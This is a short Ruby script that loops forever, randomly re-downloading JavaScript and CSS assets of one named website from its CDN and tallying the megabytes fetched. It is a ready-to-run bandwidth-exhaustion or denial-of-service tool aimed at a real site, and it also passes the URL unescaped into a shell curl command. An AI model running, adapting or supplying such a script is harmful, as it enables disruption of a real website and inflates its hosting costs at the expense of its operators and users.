@size = 0

def load(i)
  puts "Downloading #{i}..."
  `curl #{i} --output dl.temp > /dev/null 2>&1`
  @size += (File.size("dl.temp").to_f / 2**20).round(2)
  puts "Have downloaded #{@size.round(2)}MB"
end

threads = []
files = ["https://hb.wpmucdn.com/prolifewhistleblower.com/aa81feac-6079-4938-9e1a-1834fdb24c3f.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/b54eb8e5-d211-46bb-bd60-e7e2648ba5f8.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/8a9cd636-9767-4887-826d-69eee836a69b.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/c0071de9-a893-493c-8f5d-f981a73cc8b9.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/d67f30e2-e4de-4d26-beda-ed0053efbb7e.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/c211fde8-59a7-4f34-846f-a4ee2dbf3635.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/a800c419-48e1-4591-ab4f-5cac4220a153.js",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/0fc3f483-a48f-4a9e-9c7e-ba2cd0ec36fc.css",
         "https://hb.wpmucdn.com/prolifewhistleblower.com/b3430897-88a5-423c-b511-978b1f1454e9.css"]

while true
  load(files.sample)
end
